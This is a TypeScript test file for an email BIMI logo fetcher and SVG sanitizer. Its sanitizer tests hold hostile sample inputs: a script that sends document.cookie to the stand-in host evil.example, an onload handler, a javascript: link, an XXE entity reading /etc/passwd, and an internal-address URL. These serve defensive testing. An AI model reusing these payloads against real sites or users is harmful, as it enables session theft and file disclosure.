import { afterEach, describe, expect, it, vi } from "vitest";
import {
  domainOfAddress,
  fetchBimiIndicator,
  normalizeDomain,
  sanitizeSvg,
} from "../src/mail/bimi.ts";

const LOGO =
  '<svg xmlns="http://www.w3.org/2000/svg" baseProfile="tiny-ps" viewBox="0 0 64 64"><title>Acme</title><rect width="64" height="64" fill="#f60"/></svg>';

/**
 * Stubs both halves of a lookup: the DoH query for `default._bimi.<domain>`
 * and the HTTPS fetch of whatever `l=` points at.
 */
function stub(options: { record?: string; body?: string; type?: string; status?: number }): {
  fetched: () => string[];
} {
  const fetched: string[] = [];
  vi.stubGlobal("fetch", async (input: string | URL) => {
    const url = new URL(String(input));
    if (url.hostname === "cloudflare-dns.com") {
      const name = url.searchParams.get("name") ?? "";
      return Response.json({
        Status: options.record ? 0 : 3,
        Answer: options.record ? [{ name, type: 16, TTL: 60, data: `"${options.record}"` }] : [],
      });
    }
    fetched.push(url.toString());
    return new Response(options.body ?? LOGO, {
      status: options.status ?? 200,
      headers: { "content-type": options.type ?? "image/svg+xml" },
    });
  });
  return { fetched: () => fetched };
}

afterEach(() => vi.unstubAllGlobals());

describe("normalizeDomain", () => {
  it("lowercases and drops a trailing dot", () => {
    expect(normalizeDomain("GitHub.COM.")).toBe("github.com");
  });

  it("refuses what isn't a domain", () => {
    for (const bad of ["", "localhost", "no_underscores.com", "-lead.com", "x".repeat(300)]) {
      expect(normalizeDomain(bad)).toBeNull();
    }
  });
});

describe("domainOfAddress", () => {
  it("takes the part after the last @", () => {
    expect(domainOfAddress("no-reply@mail.github.com")).toBe("mail.github.com");
    expect(domainOfAddress('"odd@name"@example.com')).toBe("example.com");
  });

  it("returns null without a usable domain", () => {
    expect(domainOfAddress("nobody")).toBeNull();
    expect(domainOfAddress("user@localhost")).toBeNull();
  });
});

describe("sanitizeSvg", () => {
  it("keeps an ordinary indicator intact", () => {
    expect(sanitizeSvg(LOGO)).toContain("<rect");
  });

  it("strips script, handlers and javascript: targets", () => {
    const hostile = `<svg xmlns="http://www.w3.org/2000/svg" onload="steal()">
      <script>fetch('https://evil.example/' + document.cookie)</script>
      <a xlink:href="javascript:alert(1)"><rect width="1" height="1"/></a>
    </svg>`;
    const clean = sanitizeSvg(hostile);
    expect(clean).not.toBeNull();
    expect(clean).not.toMatch(/<script/i);
    expect(clean).not.toMatch(/onload/i);
    expect(clean).not.toMatch(/javascript:/i);
    expect(clean).toContain("<rect");
  });

  it("refuses anything that reaches off the document", () => {
    // An external reference would let the logo's host see every reader.
    expect(sanitizeSvg('<svg><image href="https://tracker.example/px.png"/></svg>')).toBeNull();
    expect(
      sanitizeSvg('<svg><rect style="fill: url(https://tracker.example/p.svg)"/></svg>'),
    ).toBeNull();
    expect(
      sanitizeSvg('<!DOCTYPE svg [<!ENTITY x SYSTEM "file:///etc/passwd">]><svg/>'),
    ).toBeNull();
  });

  it("refuses an empty result", () => {
    expect(sanitizeSvg("<script>nope()</script>")).toBeNull();
  });
});

describe("fetchBimiIndicator", () => {
  it("follows l= and reports whether the record asserts a mark certificate", async () => {
    const { fetched } = stub({
      record: "v=BIMI1; l=https://cdn.example/logo.svg; a=https://cdn.example/vmc.pem",
    });
    const found = await fetchBimiIndicator("example.com");
    expect(found?.svg).toContain("<rect");
    expect(found?.hasAuthority).toBe(true);
    expect(fetched()).toEqual(["https://cdn.example/logo.svg"]);
  });

  it("is not authoritative without a= ", async () => {
    stub({ record: "v=BIMI1; l=https://cdn.example/logo.svg" });
    expect((await fetchBimiIndicator("example.com"))?.hasAuthority).toBe(false);
  });

  it("returns null when the domain publishes nothing", async () => {
    stub({});
    expect(await fetchBimiIndicator("example.com")).toBeNull();
  });

  it("treats an empty l= as a deliberate opt-out", async () => {
    const { fetched } = stub({ record: "v=BIMI1; l=; a=" });
    expect(await fetchBimiIndicator("example.com")).toBeNull();
    expect(fetched()).toEqual([]);
  });

  it("refuses a non-https indicator", async () => {
    const { fetched } = stub({ record: "v=BIMI1; l=http://cdn.example/logo.svg" });
    expect(await fetchBimiIndicator("example.com")).toBeNull();
    expect(fetched()).toEqual([]);
  });

  it("ignores a TXT record that isn't BIMI", async () => {
    stub({ record: "v=spf1 include:_spf.example.com ~all" });
    expect(await fetchBimiIndicator("example.com")).toBeNull();
  });

  it("refuses a body that isn't an SVG", async () => {
    stub({ record: "v=BIMI1; l=https://cdn.example/logo.svg", body: "<html>nope</html>" });
    expect(await fetchBimiIndicator("example.com")).toBeNull();
  });

  it("refuses an oversized indicator", async () => {
    const huge = `<svg xmlns="http://www.w3.org/2000/svg">${"<rect/>".repeat(20_000)}</svg>`;
    stub({ record: "v=BIMI1; l=https://cdn.example/logo.svg", body: huge });
    expect(await fetchBimiIndicator("example.com")).toBeNull();
  });

  it("refuses a non-2xx response", async () => {
    stub({ record: "v=BIMI1; l=https://cdn.example/logo.svg", status: 404 });
    expect(await fetchBimiIndicator("example.com")).toBeNull();
  });

  it("does not fetch an indicator hosted on an internal address", async () => {
    const { fetched } = stub({ record: "v=BIMI1; l=https://127.0.0.1/logo.svg" });
    expect(await fetchBimiIndicator("example.com")).toBeNull();
    expect(fetched()).toEqual([]);
  });
});
